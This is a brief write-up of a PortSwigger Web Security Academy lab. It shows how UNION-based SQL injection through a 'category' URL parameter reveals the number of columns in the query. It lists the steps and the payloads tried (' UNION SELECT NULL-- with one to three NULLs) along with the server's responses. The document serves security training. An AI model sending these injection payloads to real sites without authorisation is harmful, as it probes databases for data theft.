# SQL Injection – Determining the Number of Columns with UNION

**Lab:** PortSwigger Web Security Academy  
**Topic:** SQL Injection UNION attack – identifying the correct number of columns  

---

## Steps Taken

1. **Identified Injection Point**  
   - The vulnerable parameter was the `category` filter in  
     ```
     /filter?category=Food+%26+Drink
     ```

2. **Tested for Injection**  
   - Added a single quote `'` to the parameter → received an error.  
   - Confirmed that the input was being interpreted by the SQL query.

3. **Attempted UNION SELECT**  
   - Tried appending `UNION SELECT NULL` but got server errors (HTTP 500).  
   - Continued incrementing the number of `NULL` values.

4. **Found Working Payload**  
   - At `UNION SELECT NULL,NULL,NULL` → got a **200 OK** response.  
   - This indicated the query returned **3 columns**.

---

## Payloads Tested
```sql
' UNION SELECT NULL--      → 500
' UNION SELECT NULL,NULL-- → 500
' UNION SELECT NULL,NULL,NULL-- → 200 ✅
